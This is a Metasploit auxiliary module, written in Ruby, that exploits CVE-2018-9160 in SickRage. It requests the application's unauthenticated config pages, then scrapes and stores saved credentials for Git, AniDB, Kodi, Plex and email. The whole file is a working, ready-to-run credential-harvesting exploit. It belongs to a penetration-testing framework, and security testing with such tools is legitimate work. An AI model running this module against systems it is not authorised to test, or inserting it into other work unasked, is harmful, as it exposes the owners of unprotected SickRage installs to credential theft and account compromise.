##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HTTP SickRage Password Leak',
      'Description'    => %q{
        SickRage < v2018-09-03 allows an attacker to view a user's saved Github credentials in HTTP responses unless the user has set login information for SickRage.
        By default, SickRage does not require login information for the installation.
      },
      'Author'         =>
      [
        'Sven Fassbender', # EDB POC
        'Shelby Pace'     # Metasploit Module
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2018-9160'],
          ['EDB', '44545']
        ],
      'DisclosureDate' => 'Mar 8 2018'
    ))

    register_options(
    [
      OptString.new('TARGETURI', [true, 'Optional path that gets prepended to the default paths to be searched', '/']),
      Opt::RPORT(8081)
    ])
  end

  def make_request(path)
    uri = normalize_uri(target_uri.path, path)
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => uri
    )

    if res && res.code == 200
      resHTML = res.get_html_document
      get_creds(uri.split('/').last, resHTML)
    else
      print_error("Unable to reach #{uri}")
    end
  end

  def is_valid?(user, pass)
    !(user.empty? || pass == 'None')
  end

  def save_creds(app, user, pass)
    print_good("#{app} username: #{user}")
    print_good("#{app} password: #{pass}")
    store_valid_credential(user: user, private: pass)
  end

  def get_creds(path, response)
    pages = {
      'general'       =>  'git',
      'anime'         =>  'anidb',
      'notifications' =>  ['kodi', 'plex_server', 'plex_client']
    }

    selectedPage = pages[path]
    if selectedPage.nil?
      print_error("Couldn't find results for #{path}")
    elsif selectedPage.is_a?(Array)
      selectedPage.each do |elem|
        username = response.at("input[@id=\"#{elem}_username\"]").attribute('value').to_s
        password = response.at("input[@id=\"#{elem}_password\"]").attribute('value').to_s

        if is_valid?(username, password)
          save_creds(elem, username, password)
        end
      end

      hostname = response.at('input[@id="email_host"]').attribute('value').to_s
      email_user = response.at('input[@id="email_user"]').attribute('value').to_s
      email_pass = response.at('input[@id="email_password"]').attribute('value').to_s

      if is_valid?(email_user, email_pass)
        save_creds("Email", email_user << "@#{hostname}", email_pass)
      end
    else
      username = response.at("input[@id=\"#{selectedPage}_username\"]").attribute('value').to_s
      password = response.at("input[@id=\"#{selectedPage}_password\"]").attribute('value').to_s

      if is_valid?(username, password)
        save_creds(selectedPage, username, password)
      end
    end
  end

  def run
    paths = ['/config/general/', '/config/anime/', '/config/notifications/']
    paths.each{ |selected| make_request(selected) }
  end
end
